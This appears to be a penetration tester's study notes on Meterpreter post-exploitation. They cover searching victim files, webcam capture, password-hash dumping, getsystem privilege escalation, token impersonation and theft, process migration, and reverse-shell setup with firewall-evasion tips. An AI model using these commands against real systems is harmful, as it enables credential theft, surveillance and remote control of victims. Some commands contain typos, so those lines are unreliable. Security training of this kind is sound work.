#### Meterpreter useful commands
- help
- Search
- the backslash is an escape character
	- use double backslashes when giving the window patch
	- Use a backslash in front of a space in the path.
	-`search -d c:\\documents\ and\ settings \\administrator\\desktop\\ -f *.pdf 
- upload
	`upload <file> <destination>`
- Download
	`upload <file> <pathtosave>`
	- To recursively download an entire directory, use the download -r download
- Execute : run  a command on the victim
- Shell : Drop to the victim's command prompt
- Webcam_List : list webcams
- Webcam_snap : tell a webcam to take a picture
- ps : use to find process ID (PID) or parent process ID (PPID)
- migrate : Use to migrate meterpreter to another running process on the victim. You will need to target PID
- hashdump : The output of each line is in the following format : [Username: SID: LM hash:NTLM hash::: ]
- run credcollect : run a scrpt that dumps hashes as well as collects system tokens
- getui: Display the user that the meterpreter server is running as on the target
- GetSystem: Attempt to elevate your current privileges to System (higher than admin)
- sysInfo : Get Information about the exploited target

#### METEPRETER BIND SHELL
 - Choose "bind" when you can connect directly to the victim's back door
	 - You must have a route to the target (same network is best)
	 - Target's firewall is dropped or permitting the RPORT
	 - Example:
		 - set payload windows/meterpreter/bind_tcp

#### METERPRETER REVERSE SHELL
- Choose 'reverse' when you need the victim to make a connection back to you
- Meterpreter will setup your handler (listener) as part of the payload options
	- You can set the handler to be on different computer (LHOST) from your attacker machine
	- You can set the LPORT to be different from the default 4444
	- make sure the victim's reverse connection will not be blocked by your or their firewall 
		- Set LPORT to 80 or 443
		- Make sure the LHOST is not already using the LPORT
	- Example (run on handler)
		- netstat -na
		- set lport 80
	- Some payloads include reverse_tcp_allports
		- Tries to connect back to the handler on all possible ports (1-65535, slowly)
		- Good when the victim is behind a firewall that both;
			- Disallows inbound connections
			- AND limits outbound connections to (unknown) specific ports as well

#### POST MODULES
- Some meterpreter commands might not execute well
- Look for POST modules you can also run to do the desired task
- Background your meterpreter session first before you search POST modules
- After choosing a POST module, set the meterpreter session ID in its options


#### POST 
- Meterpreter command hashdump isn’t working
- Instead use post/windows/gather/smart_hashdump module
- In this example meterpreter session is 5; smart_hashdump module is 13
```
background
sessions
search post hashdump
use 13
set session 5
run
```

#### METERPRETER IMPERSONATION
- Meterpreter allows you to pretend you are some other logged on user or running
- process
- You can then use that token in the context of that user or process
- You will need SYSTEM privilege to do this
- To impersonate a user:
	- getsystem
	- load incognito
	- list_tokens -u
	-` impersonate_token <logged on user you want to impersonate>

#### IMPERSONATE A USER
- Run these meterpreter commands to impersonate a user:
- getsystem
- load incognito
- list_tokens -u
- `impersonate_token <logged on user you want to impersonate>

#### STEAL A PROCESS TOKEN
- You can steal a token from a process launched by a user, SYSTEM, etc.
	- You will need to first identify a process you can stealfrom
	- Pay attention to the limits of the process/user
- Run these meterpreter commands to steal a token from a running process
	- getsystem
	- ps
	- `steal_token <PID of process you want to steal from>
	- Make sure you choose the PID, not the PPID (parent process ID)
	- Getprivs
	- Make sure the token gives you the privileges necessary for what you want to do

#### METERPETER PROCESS MIGRATION
- Meterpreter runs in the exploited process
- You can move meterpreter to a different (more stable) running process
- Explorer.exe is an excellent choice since it will always be running so long as there is a logged on user
- You can also try migrating to system processes such as winlogon or services
- You will need to identify the process ID (PID) or its name
- In meterpreter, run the ps command to find a process, its name, and the PID
- Then run either command:
- `migrate -N <process name>
- `migrate <process ID>

#### METERPRETER MIGRATION EXAMPLES
```
meter[reter > migrate -N explorer.exe

ps | grep notepad

```

